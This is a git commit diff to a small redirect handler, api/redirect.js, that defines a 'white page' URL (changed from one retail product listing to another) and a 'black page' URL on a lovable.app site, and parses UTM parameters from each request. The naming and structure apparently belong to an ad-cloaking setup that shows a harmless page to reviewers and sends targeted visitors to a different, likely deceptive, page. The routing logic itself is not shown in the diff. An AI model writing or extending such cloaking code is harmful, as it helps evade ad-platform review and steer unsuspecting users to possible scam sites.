34b47c54933cad0525f419a5babbcd2e7d6b678c
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-15 01:19:41 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.bigw.com.au/product/me-women-s-backpack-tan/p/6019099";
+    const whitePageURL = "https://www.kidstuff.com.au/products/freeplay-kids-gardening-sets";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
